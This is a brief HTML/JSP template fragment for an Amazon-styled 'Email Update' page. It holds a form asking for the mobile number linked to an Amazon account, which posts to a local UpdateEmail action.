...
<body>
    ...
    <%
        ...
        <div class="a-box-inner">
            <h1>Email Update</h1>
            <p>Enter mobile phone number associated with your Amazon account.</p>
            <form  method="post">
                <label for="ap_email" class="a-form-label"><b>Mobile Number</b></label>
                <input type="text" name="identifier" placeholder="Mobile number" required>
                <input type="submit" value="Continue" formaction="UpdateEmail" >
            </form>
            <div class="a-divider">
